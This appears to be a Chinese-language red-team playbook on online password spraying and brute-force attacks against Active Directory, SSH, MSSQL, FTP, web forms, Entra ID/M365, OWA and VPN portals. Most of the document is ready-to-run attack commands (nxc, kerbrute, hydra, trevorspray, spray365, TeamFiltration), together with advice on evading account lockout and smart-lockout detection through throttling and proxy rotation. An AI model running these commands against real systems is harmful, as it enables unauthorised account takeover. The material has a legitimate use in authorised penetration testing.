# 在线爆破与密码喷洒

> **TECH：** 按锁定策略做在线认证尝试  
> **IMPACT：** 有效登录（口令/协议会话）  
> **成功：** 某一协议认证成功并记 notes  
> **不是成功：** 跑完字典、账户被锁、MFA 后还当明文可用

本文件只校验到登录成功。PsExec / WinRM 横向 / 读 LAPS LDAP 不在这里。

---

## 1. 先读策略（GATES）

爆破 = 一用户多密码（易锁）。喷洒 = 一密码多用户（默认更安全）。

```bash
nxc smb DC -u user -p 'known' --pass-pol
net accounts /domain
```

记下：

```text
Lockout threshold
Lockout observation window
Lockout duration
复杂度 / 最小长度（只影响字典，不阻止喷洒）
```

```text
threshold = 5  → 每用户最多试 4 次后换窗口
threshold = 0  → 仍要节流，避免 EDR/智能锁
读不到策略     → 每用户 1 次密码，拉长间隔
```

Entra / 托管 IdP：不要用域 `net accounts` 去套。Smart lockout 是动态的。先小样本测失败响应，再决定每轮间隔。禁止写死「60 分钟、每天 3 轮」当通用规则。

---

## 2. 用户名

```bash
username-anarchy --input-file names.txt --select-format first.last > users.txt
kerbrute userenum -d corp.com --dc DC users.txt
```

外网 Entra：

```bash
o365spray --enum -d target.com -u users.txt
TeamFiltration --outpath out --enum --domain target.com
```

枚举出的有效用户再喷，不要对未验证的 mega 列表硬喷。

---

## 3. 域内喷洒

```bash
# SMB
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success

# Kerberos（通常更安静，失败在 4768/4771）
kerbrute passwordspray -d corp.com --dc DC users.txt 'Spring2026!'

# 多协议校验同一口令（命中后再做，仍是校验不是横向）
nxc smb  TARGET -u jen -p 'HitPass!'
nxc winrm TARGET -u jen -p 'HitPass!'
nxc ssh   TARGET -u jen -p 'HitPass!'
```

`Pwn3d!` 表示该主机本地管理，仍只记凭据+权限事实。不要在这里 `nxc -x whoami` 当主路径（那是 `/ad-attack` / `/post`）。

季节口令、公司名+年份、喷完的 cracked 口令复用，都走这一节。

---

## 4. 爆破（hydra / nxc）

只在 **无 lockout 或单账户服务**（SSH 个人机、FTP、MSSQL sa、HTTP 表单）使用。

```bash
hydra -l user -P rockyou.txt TARGET ssh
hydra -l sa -P rockyou.txt TARGET mssql
hydra -l anonymous -P rockyou.txt TARGET ftp
hydra TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid' -l admin -P rockyou.txt

nxc smb TARGET -u user -P passwords.txt --continue-on-success
nxc ssh TARGET -u user -P passwords.txt
```

RDP 爆破噪声极大，有 lockout 时不要做。

---

## 5. 外网 / 云入口

### Entra ID / M365

```bash
# TREVORspray：代理轮换
trevorspray -u users.txt -p 'Spring2026!' --ssh user@proxy1 user@proxy2

# Spray365：按计划绕 smart lockout（生成计划后看 delay，不要盲用默认）
spray365 generate -d target.com -u users.txt -pf passwords.txt --delay 30 -ep plan.s365
spray365 spray -ep plan.s365

TeamFiltration --outpath out --spray --passwords passwords.txt
```

命中后测试：能否登录 portal、是否 MFA、是否有 refresh。**MFA 后的 cookie/device 码不在这里造**（`/phishing`）。有效密码 + 无 MFA → 记 notes，云面枚举候选 `/cloud-recon`。

### OWA / Exchange

```bash
trevorspray -m owa -u users.txt -p 'Spring2026!' --url https://mail.target.com
```

### VPN / Citrix

每个 portal 字段不同。先抓登录 POST，再 hydra `https-post-form`。失败关键字必须是真实响应里的，不要抄别的设备的 `invalid`。

---

## 6. 字典

```bash
cewl http://target.com -d 3 -m 5 -w custom.txt
hashcat --stdout custom.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
```

喷洒用短列表（季节、公司、默认）。长 rockyou 只给无 lockout 的爆破或离线。

---

## RESTORE / 注意

喷洒会写失败日志、可能锁账户。授权测试控制速率。被锁的账户记 notes，不要继续砸同一用户。
